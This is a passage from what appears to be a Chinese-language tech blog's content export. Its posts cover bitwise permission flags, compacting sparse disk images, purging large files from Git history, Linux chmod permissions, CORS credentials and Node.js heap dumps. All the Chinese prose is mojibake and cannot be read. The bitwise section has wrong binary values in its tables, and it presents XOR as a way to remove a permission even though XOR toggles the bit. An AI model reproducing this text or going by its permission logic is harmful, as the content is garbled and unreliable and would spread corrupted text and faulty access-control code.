class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¯»   å†™   æ‰§è¡Œ      äºŒè¿›åˆ¶      åè¿›åˆ¶</span><br><span class="line">1    1    0   ==&gt;   110   ==&gt;  6</span><br><span class="line">0    0    1   ==&gt;   001   ==&gt;  1</span><br><span class="line">0    0    0   ==&gt;   000   ==&gt;  0  // ä¸ï¼ˆ&amp;ï¼‰è¿ç®—ç»“æœ</span><br></pre></td></tr></table></figure><p>æƒé™ç <code>6</code>ï¼ˆ<code>110</code>ï¼‰å’Œ<code>1</code>ï¼ˆ<code>001</code>ï¼‰çš„ä¸è¿ç®—ç»“æœä¸º<code>0</code>ï¼Œå³ï¼š<code>0 = 6 &amp; 1</code>ã€‚</p><p>æ ¹æ®ä¸è¿ç®—çš„è®¡ç®—è§„å¾‹ï¼Œå½“è¿ç®—ç»“æœä¸ºæ‰€è¦åˆ¤æ–­æƒé™æœ¬èº«å€¼æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸ºç”¨æˆ·å…·æœ‰è¿™ä¸ªæƒé™ã€‚è€Œå½“è¿ç®—ç»“æœä¸º <code>0</code> æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸ºç”¨æˆ·ä¸å…·æœ‰è¿™ä¸ªæƒé™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checkPermission (æƒé™é›†å€¼, æƒé™é¡¹) &#123;</span><br><span class="line">    return æƒé™é›†å€¼ &amp; æƒé™é¡¹ == æƒé™é¡¹</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="éè¿ç®—å®ç°æƒé™çš„å‡å°‘"><a href="#éè¿ç®—å®ç°æƒé™çš„å‡å°‘" class="headerlink" title="éè¿ç®—å®ç°æƒé™çš„å‡å°‘"></a>éè¿ç®—å®ç°æƒé™çš„å‡å°‘</h4><p>ä½è¿ç®—åŒæ ·å¯ä»¥å®ç°ç”¨æˆ·æƒé™çš„å‡å°‘ï¼Œå‡å°‘ç”¨æˆ·æƒé™ä½¿ç”¨<code>é</code>ï¼ˆ<code>^</code>ï¼‰è¿ç®—ã€‚</p><p>å¦‚ï¼Œå°†æƒé™ç ä¸º<code>7</code>ç”¨æˆ·ï¼Œç§»é™¤æ‰§è¡Œæƒé™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¯»   å†™   æ‰§è¡Œ      äºŒè¿›åˆ¶      åè¿›åˆ¶</span><br><span class="line">1    1    1   ==&gt;   110   ==&gt;  7</span><br><span class="line">0    0    1   ==&gt;   001   ==&gt;  1</span><br><span class="line">1    1    0   ==&gt;   000   ==&gt;  6  // éï¼ˆ^ï¼‰è¿ç®—ç»“æœ</span><br></pre></td></tr></table></figure><p>æƒé™ç <code>7</code>ï¼ˆ<code>111</code>ï¼‰å’Œ<code>1</code>ï¼ˆ<code>001</code>ï¼‰çš„éè¿ç®—ç»“æœä¸º<code>6</code>ï¼Œå³ï¼š<code>6 = 7 ^ 1</code>ï¼Œä¹Ÿå¯ä»¥ç”±<code>6 = 7 - 1</code>è®¡ç®—å¾—å‡ºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">deletePermission (æƒé™é›†å€¼, æƒé™é¡¹) &#123;</span><br><span class="line">    return æƒé™é›†å€¼ ^ æƒé™é¡¹</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å»¶ä¼¸"><a href="#å»¶ä¼¸" class="headerlink" title="å»¶ä¼¸"></a>å»¶ä¼¸</h3><p>å¦‚æœæƒé™é›†è¶…è¿‡ä¸‰ç§å‘¢ï¼Ÿ<br>ä¾‹å­ï¼šç”¨ä½æƒé™è¡¨ç¤º<code>å¢</code>ã€<code>åˆ </code>ã€<code>æ”¹</code>ã€<code>æŸ¥</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">å¢ åˆ  æ”¹  æŸ¥        äºŒè¿›åˆ¶     åè¿›åˆ¶</span><br><span class="line">0  0  0  0   ==&gt;   0000   ==&gt;   0</span><br><span class="line">0  0  0  1   ==&gt;   0001   ==&gt;   1   // æŸ¥</span><br><span class="line">0  0  1  0   ==&gt;   0010   ==&gt;   2   // æ”¹</span><br><span class="line">0  1  0  0   ==&gt;   0100   ==&gt;   4   // åˆ </span><br><span class="line">1  0  0  0   ==&gt;   1000   ==&gt;   8   // å¢</span><br><span class="line"></span><br><span class="line">0  0  1  1  ==&gt;   0011   ==&gt;   3   // æ”¹ + æŸ¥</span><br><span class="line">0  1  1  1  ==&gt;   0111   ==&gt;   7   // åˆ  + æ”¹ + æŸ¥</span><br><span class="line">1  1  1  1  ==&gt;   1111   ==&gt;   15  // å¢ + åˆ  + æ”¹ + æŸ¥</span><br><span class="line">1  0  1  1  ==&gt;   1011   ==&gt;   11  // å¢ + æ”¹ + æŸ¥</span><br></pre></td></tr></table></figure><p>å¦‚æœç±»å‹æœ‰<code>N</code>ç§ï¼Œæˆ‘ä»¬å°±ç”¨<code>N</code>ä½äºŒè¿›åˆ¶æ¥è¡¨ç¤ºã€‚</p><blockquote><p>ä½è¿ç®—ä¹Ÿæœ‰ä¸€äº›å±€é™æ€§ï¼Œéšç€æƒé™ç å¢åŠ ï¼Œæ•°æ®é•¿åº¦ä¹Ÿç›¸åº”çš„å¢é•¿ã€‚è¿™å°±è¦æ±‚æƒé™ç ä¸èƒ½è¶…è¿‡è®¡ç®—æœ¬èº«è¿ç®—é•¿åº¦ï¼Œåœ¨æ•°æ®åº“ä¸­å­˜å‚¨æƒé™ç æ—¶ï¼Œæƒé™ç é•¿åº¦ä¹Ÿä¸èƒ½çš„è¶…è¿‡æ‰€ä½¿ç”¨æ•°æ®ç±»å‹ã€‚å¦‚ï¼šåœ¨32ä½ç³»ç»Ÿä¸­ä¸èƒ½è¶…è¿‡232ï¼Œä¹Ÿå°±æ˜¯æƒé™æ•°é‡ä¸èƒ½å¤šäº32ä¸ªã€‚è€ŒmySQLæ•°æ®åº“çš„BIGINTï¼Œå…¶å­˜å‚¨ç©ºé—´ä¸º8Byteï¼Œä½¿ç”¨BIGINTå­˜å‚¨å­˜å‚¨ç æ—¶ï¼Œæƒé™æ•°ä¸èƒ½å¤šäº64ä¸ª(8*8-1)ã€‚</p></blockquote><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://itbilu.com/other/relate/4yJxR6awl.html">ã€1ã€‘</a> <a href="http://blog.csdn.net/ajian005/article/details/8490899">ã€2ã€‘</a> <a href="https://xiaobin.net/200906/bitwise-permission/">ã€3ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> bitwise </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‹ç¼©ç¨€ç–é•œåƒ</title>
      <link href="/post/compact-sparse-bundle-image.html"/>
      <url>/post/compact-sparse-bundle-image.html</url>
      
        <content type="html"><![CDATA[<h3 id="é‡Šæ”¾ç¨€ç–ç£ç›˜æ˜ åƒç©ºæ´"><a href="#é‡Šæ”¾ç¨€ç–ç£ç›˜æ˜ åƒç©ºæ´" class="headerlink" title="é‡Šæ”¾ç¨€ç–ç£ç›˜æ˜ åƒç©ºæ´"></a>é‡Šæ”¾ç¨€ç–ç£ç›˜æ˜ åƒç©ºæ´</h3><p>å¦‚æœç›´æ¥å»åˆ é™¤é•œåƒçš„æ–‡ä»¶åé•œåƒå¤§å°ä¸ä¼šæ”¹å˜ï¼Œè¿™æ—¶å€™éœ€è¦å»æ‰‹åŠ¨é‡Šæ”¾ä¸€ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hdiutil compact /path/to/disk-image</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Git æ¸…ç†å¤§æ–‡ä»¶</title>
      <link href="/post/git-delete-large-file.html"/>
      <url>/post/git-delete-large-file.html</url>
      
        <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>æœ‰äº›æ—¶å€™ï¼Œæœ‰äººè¯¯æäº¤äº†ä¸€äº›å¤§æ–‡ä»¶æˆ–è€…æ•æ„Ÿæ–‡ä»¶ã€‚æˆ‘ä»¬éœ€è¦æ¸…ç†æ‰è¿™äº›æ–‡ä»¶çš„æäº¤è®°å½•ã€‚<br>ä¸‹é¢æˆ‘ä»¬å°±ä»¥æ¸…ç†æ¸…ç†å¤§æ–‡ä»¶æ¥ä»‹ç»ä¸€ä¸‹ã€‚</p><h3 id="æ“ä½œæ­¥éª¤"><a href="#æ“ä½œæ­¥éª¤" class="headerlink" title="æ“ä½œæ­¥éª¤"></a>æ“ä½œæ­¥éª¤</h3><h4 id="Step-1-æŸ¥çœ‹å“ªäº›å†å²æäº¤è¿‡æ–‡ä»¶å ç”¨ç©ºé—´è¾ƒå¤§"><a href="#Step-1-æŸ¥çœ‹å“ªäº›å†å²æäº¤è¿‡æ–‡ä»¶å ç”¨ç©ºé—´è¾ƒå¤§" class="headerlink" title="Step 1 æŸ¥çœ‹å“ªäº›å†å²æäº¤è¿‡æ–‡ä»¶å ç”¨ç©ºé—´è¾ƒå¤§"></a>Step 1 æŸ¥çœ‹å“ªäº›å†å²æäº¤è¿‡æ–‡ä»¶å ç”¨ç©ºé—´è¾ƒå¤§</h4><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹å ç”¨ç©ºé—´æœ€å¤šçš„äº”ä¸ªæ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rev-list --objects --all | grep &quot;$(git verify-pack -v .git/objects/pack/*.idx | sort -k 3 -n | tail -5 | awk &#x27;&#123;print$1&#125;&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>rev-list å‘½ä»¤ç”¨æ¥åˆ—å‡º Git ä»“åº“ä¸­çš„æäº¤ï¼Œæˆ‘ä»¬ç”¨å®ƒæ¥åˆ—å‡ºæ‰€æœ‰æäº¤ä¸­æ¶‰åŠçš„æ–‡ä»¶ååŠå…¶IDã€‚ è¯¥å‘½ä»¤å¯ä»¥æŒ‡å®šåªæ˜¾ç¤ºæŸä¸ªå¼•ç”¨ï¼ˆæˆ–åˆ†æ”¯ï¼‰çš„ä¸Šä¸‹æ¸¸çš„æäº¤ã€‚</p><blockquote><p>â€“objectsï¼šåˆ—å‡ºè¯¥æäº¤æ¶‰åŠçš„æ‰€æœ‰æ–‡ä»¶IDã€‚</p></blockquote><blockquote><p>â€“allï¼šæ‰€æœ‰åˆ†æ”¯çš„æäº¤ï¼Œç›¸å½“äºæŒ‡å®šäº†ä½äº&#x2F;refsä¸‹çš„æ‰€æœ‰å¼•ç”¨ã€‚</p></blockquote><blockquote><p>verify-packå‘½ä»¤ç”¨äºæ˜¾ç¤ºå·²æ‰“åŒ…çš„å†…å®¹ã€‚</p></blockquote><h4 id="Step-2-é‡å†™commitï¼Œåˆ é™¤å¤§æ–‡ä»¶"><a href="#Step-2-é‡å†™commitï¼Œåˆ é™¤å¤§æ–‡ä»¶" class="headerlink" title="Step 2 é‡å†™commitï¼Œåˆ é™¤å¤§æ–‡ä»¶"></a>Step 2 é‡å†™commitï¼Œåˆ é™¤å¤§æ–‡ä»¶</h4><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼Œåˆ é™¤å†å²æäº¤è¿‡çš„å¤§æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git filter-branch --force --index-filter &#x27;git rm -rf --cached --ignore-unmatch big-file.jar&#x27; --prune-empty --tag-name-filter cat -- --all</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è„šæœ¬ä¸­çš„ big-file.jar è¯·æ¢æˆä½ ç¬¬ä¸€æ­¥æŸ¥å‡ºçš„å¤§æ–‡ä»¶åï¼Œæˆ–è€…è¿™é‡Œç›´æ¥å†™ä¸€ä¸ªç›®å½•ã€‚</p><p>filter-branch å‘½ä»¤å¯ä»¥ç”¨æ¥é‡å†™Gitä»“åº“ä¸­çš„æäº¤</p><blockquote><p>â€“index-filterå‚æ•°ç”¨æ¥æŒ‡å®šä¸€æ¡Bashå‘½ä»¤ï¼Œç„¶åGitä¼šæ£€å‡ºï¼ˆcheckoutï¼‰æ‰€æœ‰çš„æäº¤ï¼Œ æ‰§è¡Œè¯¥å‘½ä»¤ï¼Œç„¶åé‡æ–°æäº¤ã€‚</p></blockquote><blockquote><p>â€“allå‚æ•°è¡¨ç¤ºæˆ‘ä»¬éœ€è¦é‡å†™æ‰€æœ‰åˆ†æ”¯ï¼ˆæˆ–å¼•ç”¨ï¼‰ã€‚</p></blockquote><p>åœ¨é‡å†™æäº¤çš„è¿‡ç¨‹ä¸­ï¼Œä¼šæœ‰ä»¥ä¸‹æ—¥å¿—è¾“å‡º:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rewrite 6cdbb293d453ced07e6a07e0aa6e580e6a5538f4 (266/266)</span><br><span class="line"># Ref &#x27;refs/heads/master&#x27; was rewritten</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¾ç¤º <code>xxxxx unchanged</code> , è¯´æ˜repoé‡Œæ²¡æœ‰æ‰¾åˆ°è¯¥æ–‡ä»¶, è¯·æ£€æŸ¥è·¯å¾„å’Œæ–‡ä»¶åæ˜¯å¦æ­£ç¡®ï¼Œé‡å¤ä¸Šé¢çš„è„šæœ¬ï¼ŒæŠŠæ‰€æœ‰ä½ æƒ³åˆ é™¤çš„æ–‡ä»¶éƒ½åˆ æ‰ã€‚</p><h4 id="Step-3-æ¨é€ä¿®æ”¹åçš„repo"><a href="#Step-3-æ¨é€ä¿®æ”¹åçš„repo" class="headerlink" title="Step 3 æ¨é€ä¿®æ”¹åçš„repo"></a>Step 3 æ¨é€ä¿®æ”¹åçš„repo</h4><p>ä»¥å¼ºåˆ¶è¦†ç›–çš„æ–¹å¼æ¨é€ä½ çš„repo, å‘½ä»¤å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin master --force</span><br></pre></td></tr></table></figure><h4 id="Step-4-æ¸…ç†å’Œå›æ”¶ç©ºé—´"><a href="#Step-4-æ¸…ç†å’Œå›æ”¶ç©ºé—´" class="headerlink" title="Step 4 æ¸…ç†å’Œå›æ”¶ç©ºé—´"></a>Step 4 æ¸…ç†å’Œå›æ”¶ç©ºé—´</h4><p>è™½ç„¶ä¸Šé¢æˆ‘ä»¬å·²ç»åˆ é™¤äº†æ–‡ä»¶, ä½†æ˜¯æˆ‘ä»¬çš„repoé‡Œé¢ä»ç„¶ä¿ç•™äº†è¿™äº›objects, ç­‰å¾…åƒåœ¾å›æ”¶(GC), æ‰€ä»¥æˆ‘ä»¬è¦ç”¨å‘½ä»¤å½»åº•æ¸…é™¤å®ƒ, å¹¶æ”¶å›ç©ºé—´ï¼Œå‘½ä»¤å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm -rf .git/refs/original/</span><br><span class="line"></span><br><span class="line">git reflog expire --expire=now --all</span><br><span class="line"></span><br><span class="line">git gc --prune=now</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»å½»åº•çš„åˆ é™¤äº†æˆ‘ä»¬ä¸æƒ³è¦çš„æ–‡ä»¶ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://www.hollischuang.com/archives/1708">è®°ä¸€æ¬¡åˆ é™¤Gitè®°å½•ä¸­çš„å¤§æ–‡ä»¶çš„è¿‡ç¨‹</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxæ–‡ä»¶æƒé™</title>
      <link href="/post/linux-file-permissions.html"/>
      <url>/post/linux-file-permissions.html</url>
      
        <content type="html"><![CDATA[<p>chmodæ˜¯Linuxä¸‹è®¾ç½®æ–‡ä»¶æƒé™çš„å‘½ä»¤ï¼Œåé¢çš„æ•°å­—è¡¨ç¤ºä¸åŒç”¨æˆ·æˆ–ç”¨æˆ·ç»„çš„æƒé™ã€‚</p><p>ä¸€èˆ¬æ˜¯ä¸‰ä¸ªæ•°å­—ï¼š<br>ç¬¬ä¸€ä¸ªæ•°å­—è¡¨ç¤ºæ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™<br>ç¬¬äºŒä¸ªæ•°å­—è¡¨ç¤ºä¸æ–‡ä»¶æ‰€æœ‰è€…åŒå±ä¸€ä¸ªç”¨æˆ·ç»„çš„å…¶ä»–ç”¨æˆ·çš„æƒé™<br>ç¬¬ä¸‰ä¸ªæ•°å­—è¡¨ç¤ºå…¶å®ƒç”¨æˆ·ç»„çš„æƒé™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æƒé™åˆ†ä¸ºä¸‰ç§ï¼šè¯»ï¼ˆr=4ï¼‰ã€å†™ï¼ˆw=2ï¼‰ã€æ‰§è¡Œï¼ˆx=1ï¼‰ã€‚ ç»¼åˆèµ·æ¥è¿˜æœ‰å¯è¯»å¯æ‰§è¡Œï¼ˆrx=5=4+1ï¼‰ã€å¯è¯»å¯å†™ï¼ˆrw=6=4+2ï¼‰ã€å¯è¯»å¯å†™å¯æ‰§è¡Œï¼ˆrwx=7=4+2+1ï¼‰ã€‚</span><br><span class="line">æ‰€ä»¥ï¼Œchmod 755 è®¾ç½®ç”¨æˆ·çš„æƒé™ä¸ºï¼š</span><br></pre></td></tr></table></figure><table><thead><tr><th>ä½</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>7</td><td>æ–‡ä»¶æ‰€æœ‰è€…å¯è¯»å¯å†™å¯æ‰§è¡Œ</td></tr><tr><td>5</td><td>ä¸æ–‡ä»¶æ‰€æœ‰è€…åŒå±ä¸€ä¸ªç”¨æˆ·ç»„çš„å…¶ä»–ç”¨æˆ·å¯è¯»å¯æ‰§è¡Œ</td></tr><tr><td>5</td><td>å…¶å®ƒç”¨æˆ·ç»„å¯è¯»å¯æ‰§è¡Œ</td></tr></tbody></table><p>chattr [+&#x2F;-]i filename </p><h3 id="x-æƒé™"><a href="#x-æƒé™" class="headerlink" title="x æƒé™"></a>x æƒé™</h3><ul><li><p>æ–‡ä»¶</p><p>  æœ‰æƒé™æ‰§è¡Œ <code>./</code></p></li><li><p>ç›®å½•</p><p>  æœ‰æƒé™è¿›å…¥ <code>cd</code></p></li></ul><h3 id="r-æƒé™"><a href="#r-æƒé™" class="headerlink" title="r æƒé™"></a>r æƒé™</h3><ul><li><p>æ–‡ä»¶</p><p>  æœ‰æƒé™è¯» <code>cat</code></p></li><li><p>ç›®å½•</p><p>  æœ‰æƒé™æŸ¥çœ‹ <code>ls</code></p></li></ul><h3 id="w-æƒé™"><a href="#w-æƒé™" class="headerlink" title="w æƒé™"></a>w æƒé™</h3><ul><li><p>æ–‡ä»¶</p><p>  æœ‰æƒé™å†™ <code>echo hello &gt;</code></p></li><li><p>ç›®å½•</p><p>  æœ‰æƒé™å†™å…¥ <code>touch</code> æœ‰æƒé™åˆ é™¤ <code>rm</code></p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nginx_try_files</title>
      <link href="/post/nginx_try_files.html"/>
      <url>/post/nginx_try_files.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://openresty.org/download/agentzh-nginx-tutorials-zhcn.html#02-NginxDirectiveExecOrder11">https://openresty.org/download/agentzh-nginx-tutorials-zhcn.html#02-NginxDirectiveExecOrder11</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è·¨åŸŸèµ„æºå…±äº« CORS</title>
      <link href="/post/cors.html"/>
      <url>/post/cors.html</url>
      
        <content type="html"><![CDATA[<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>Cross-Origin Resource Sharingï¼ˆCORSï¼‰æ˜¯HTTPåœ¨åè®®å±‚å¯¹å¤„ç†è·¨åŸŸé—®é¢˜ç»™å‡ºçš„æ–¹æ¡ˆã€‚åœ¨æ‰€æœ‰ç°ä»£æµè§ˆå™¨ä¸­éƒ½å¯ä»¥ä½¿ç”¨CORSæ¥å¤„ç†è·¨åŸŸï¼Œå¯¹äºä¸æ”¯æŒçš„æµè§ˆå™¨å¯ä»¥é™çº§ä½¿ç”¨JSONPæ–¹æ¡ˆä»£æ›¿ã€‚</p><iframe src="https://caniuse.com/cors/embed/description&links" width="100%" height="350px" frameborder="0" loading="lazy" allowfullscreen></iframe><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p><a href="https://enable-cors.org/index.html">https://enable-cors.org/index.html</a></p><h3 id="æºå¸¦Cookie"><a href="#æºå¸¦Cookie" class="headerlink" title="æºå¸¦Cookie"></a>æºå¸¦Cookie</h3><p>è·¨åŸŸajaxè¯·æ±‚æ—¶é»˜è®¤æ˜¯ä¸ä¼šæºå¸¦Cookieçš„ï¼Œéœ€è¦è®¾ç½®<code>withCredentials</code>ä¸ºtrueã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> invocation = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://bar.other/resources/credentialed-content/&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callOtherDomain</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(invocation) &#123;</span><br><span class="line">        invocation.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">        invocation.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line">        invocation.<span class="property">onreadystatechange</span> = handler;</span><br><span class="line">        invocation.<span class="title function_">send</span>(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h3><ol><li><p>preflight</p><p> å¯¹äº <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS#%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82">å¤æ‚è¯·æ±‚</a> æµè§ˆå™¨ä¼šå‘èµ·é¢„è¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½® <code>Access-Control-Max-Age</code> æŒ‡å®šäº† <code>preflight</code> è¯·æ±‚çš„ç»“æœèƒ½å¤Ÿè¢«ç¼“å­˜å¤šä¹…ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æµè§ˆå™¨ä¸æ˜¯æ ¹æ®åŸŸåæ¥åšç¼“å­˜çš„ï¼Œæ˜¯æ ¹ç»URLã€‚å¦‚æœURLæˆ–è€…Queryä¸ä¸€æ ·ï¼Œæ¯æ¬¡éƒ½ä¼šå‘èµ· <code>preflight</code>ã€‚</p></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">HTTPè®¿é—®æ§åˆ¶ï¼ˆCORSï¼‰</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> cors </tag>
            
            <tag> ajax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘ç«™é¢„åŠ è½½æŠ€æœ¯</title>
      <link href="/post/prefetching-preloading-prebrowsing.html"/>
      <url>/post/prefetching-preloading-prebrowsing.html</url>
      
        <content type="html"><![CDATA[<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.alloyteam.com/2015/10/prefetching-preloading-prebrowsing/">ã€1ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>v8å †å†…å­˜åˆ†æ</title>
      <link href="/post/v8-heapdump.html"/>
      <url>/post/v8-heapdump.html</url>
      
        <content type="html"><![CDATA[<h3 id="Node-js-å†…å­˜åˆ†æ"><a href="#Node-js-å†…å­˜åˆ†æ" class="headerlink" title="Node.js å†…å­˜åˆ†æ"></a>Node.js å†…å­˜åˆ†æ</h3><h3 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><h4 id="heapdump"><a href="#heapdump" class="headerlink" title="heapdump"></a>heapdump</h4><p>heapdump å¯ä»¥ä½¿ç”¨æ¥å°† v8 å¼•æ“çš„å †å†…å­˜å†…å®¹dumpå‡ºæ¥ï¼Œè¿™æ ·ä½ å°±å¯ä»¥åœ¨ Chrome çš„å¼€å‘è€…å·¥å…·ä¸­æŸ¥çœ‹é—®é¢˜ã€‚</p><p>å‘é€ä¿¡å· <code>kill -USR2 &lt;pid&gt;</code> åä¼šç”Ÿæˆä¸€ä¸ªå†…å­˜çš„å¿«ç…§ã€‚å¯¼å…¥å¼€å‘è€…å·¥å…·ä¸­å°±èƒ½æŸ¥çœ‹äº†ã€‚</p><h4 id="memwatch"><a href="#memwatch" class="headerlink" title="memwatch"></a>memwatch</h4><p>è¿™ä¸ªå¯ä»¥åœ¨ä»£ç é‡Œç›´æ¥ä½¿ç”¨ï¼Œå®æ—¶æ£€æµ‹å†…å­˜åŠ¨æ€ï¼Œå½“å‘ç”Ÿå†…å­˜æ³„æ¼çš„æ—¶å€™ï¼Œä¼šè§¦å‘ <code>leak</code> äº‹ä»¶ï¼Œä¼šä¼ é€’å½“å‰çš„å †çŠ¶æ€ï¼Œé…åˆ heapdump æœ‰å¥‡æ•ˆã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> memwatch = <span class="built_in">require</span>(<span class="string">&#x27;memwatch&#x27;</span>);</span><br><span class="line"></span><br><span class="line">memwatch.<span class="title function_">on</span>(<span class="string">&#x27;leak&#x27;</span>, <span class="keyword">function</span>(<span class="params">info</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(info);</span><br><span class="line">    <span class="keyword">let</span> file = <span class="string">&#x27;/tmp/myapp-&#x27;</span> + process.<span class="property">pid</span> + <span class="string">&#x27;-&#x27;</span> + <span class="title class_">Date</span>.<span class="title function_">now</span>() + <span class="string">&#x27;.heapsnapshot&#x27;</span>;</span><br><span class="line">    heapdump.<span class="title function_">writeSnapshot</span>(file, <span class="keyword">function</span>(<span class="params">err</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Wrote snapshot: &#x27;</span> + file);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="devTool"><a href="#devTool" class="headerlink" title="devTool"></a>devTool</h4><p>å®‰è£… <code>npm install -g devtool</code></p><p>å¯ä»¥åœ¨ devtool åˆ†æ dump å‡ºæ¥çš„å†…å­˜ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ devtool æ¥è°ƒè¯•ä»£ç ã€‚ç›´æ¥ <code>devtool app.js</code> è¿è¡Œä»£ç ã€‚</p><p><img src="/images/QQ20170228-182355@2x.jpg"><br><img src="/images/QQ20170228-182213@2x.jpg"></p><p>å 